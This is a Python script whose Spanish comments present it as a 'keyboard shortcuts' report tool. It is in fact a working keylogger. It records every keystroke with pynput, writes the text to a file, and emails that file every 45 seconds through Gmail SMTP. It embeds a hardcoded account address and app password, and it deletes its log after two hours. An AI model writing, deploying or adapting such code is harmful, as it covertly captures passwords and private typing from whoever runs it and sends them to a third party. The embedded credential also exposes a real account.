import time
import os
import sys
from pynput import keyboard
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

# Configuración del servidor SMTP y del correo
smtp_server = "smtp.gmail.com"
smtp_port = 587
sender_email = "ali.gonzalezqa@gmail.com"
sender_password = "qwyfrkxbsvlplnyz"
recipient_email = "ali.gonzalezqa@gmail.com"

# Nombre y ruta del archivo de texto
output_file = "atajos.txt"

# Variable para almacenar los atajos
shortcut_data = ""

# Función para enviar el correo
def send_email():
    # Crear el mensaje del correo
    message = MIMEMultipart()
    message["Subject"] = "Informe de Atajos de Teclado"
    message["From"] = sender_email
    message["To"] = recipient_email

    # Adjuntar el archivo de texto
    with open(output_file, "r") as file:
        attachment = MIMEBase("application", "octet-stream")
        attachment.set_payload(file.read())
        encoders.encode_base64(attachment)
        attachment.add_header("Content-Disposition", f"attachment; filename= {output_file}")
        message.attach(attachment)

    # Enviar el correo
    with smtplib.SMTP(smtp_server, smtp_port) as server:
        server.starttls()
        server.login(sender_email, sender_password)
        server.send_message(message)

    # Reiniciar los datos de los atajos
    shortcut_data = ""

# Función para capturar los eventos de teclado
def on_press(key):
    global shortcut_data

    if key == keyboard.Key.enter:
        # Eliminar las comillas simples de los atajos
        cleaned_shortcuts = shortcut_data.replace("'", "")

        # Guardar los datos de los atajos en el archivo
        with open(output_file, "a") as file:
            file.write(cleaned_shortcuts + "\n")
        
        # Reiniciar los datos de los atajos
        shortcut_data = ""
    elif key == keyboard.Key.space:
        # Agregar un espacio en lugar del nombre de la tecla
        shortcut_data += " "
    elif key == keyboard.Key.backspace:
        # Eliminar el último carácter escrito
        shortcut_data = shortcut_data[:-1]
    elif key == keyboard.Key.shift:
        # Ignorar la tecla Shift
        pass
    else:
        # Agregar el atajo a los datos
        shortcut_data += str(key).replace("'", "")

# Configurar el listener de teclado
listener = keyboard.Listener(on_press=on_press)
listener.start()

# Calcular el tiempo límite de ejecución (2 horas)
tiempo_limite = time.time() + 2 * 60 * 60

# Bucle principal
while True:
    # Verificar si ha pasado el tiempo límite
    if time.time() >= tiempo_limite:
        # Eliminar el archivo de texto
        os.remove(output_file)
        
        # Salir del programa
        sys.exit()
    
    # Esperar 20 minutos
    time.sleep(45)
    
    # Enviar el correo con el informe de atajos
    send_email()